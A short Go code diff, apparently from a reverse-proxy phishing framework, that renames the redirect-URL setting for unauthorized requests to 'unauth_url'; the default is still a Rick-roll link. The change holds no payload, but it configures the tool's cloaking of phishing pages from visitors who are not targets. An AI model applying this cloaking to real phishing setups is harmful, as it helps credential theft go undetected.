@@ -60,7 +60,7 @@ type GeneralConfig struct {
 	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
 	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
 	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	RedirectUrl  string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
+	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 }
@@ -90,7 +90,7 @@ const (
 	CFG_SUBPHISHLETS = "subphishlets"
 )
 
-const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -142,8 +142,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.SetBlacklistMode("unauth")
 	}
 
-	if c.general.RedirectUrl == "" && created_cfg {
-		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
+	if c.general.UnauthUrl == "" && created_cfg {
+		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
 	}
 	if c.general.HttpsPort == 0 {
 		c.SetHttpsPort(443)
@@ -397,8 +397,8 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
-func (c *Config) SetRedirectUrl(url string) {
-	c.general.RedirectUrl = url
+func (c *Config) SetUnauthUrl(url string) {
+	c.general.UnauthUrl = url
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("unauthorized request redirection URL set to: %s", url)
 	c.cfg.WriteConfig()
